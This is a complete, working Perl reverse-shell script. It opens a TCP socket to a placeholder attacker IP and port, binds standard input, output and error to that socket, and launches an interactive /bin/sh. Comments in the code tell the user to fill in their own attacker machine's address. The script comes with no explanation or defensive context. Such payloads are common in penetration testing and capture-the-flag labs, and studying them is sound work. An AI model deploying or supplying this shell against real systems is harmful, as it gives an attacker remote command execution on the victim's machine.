#!/usr/bin/perl
use Socket;

$ip = "10.10.10.10";   # Change this to the IP address of your attacker machine
$port = 1337;          # Change this to the port number that the attacker listens on

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Can't create socket: $!";
connect(SOCK, sockaddr_in($port, inet_aton($ip))) or die "Can't connect: $!";
open(STDIN, ">&SOCK");
open(STDOUT, ">&SOCK");
open(STDERR, ">&SOCK");
exec("/bin/sh -i");
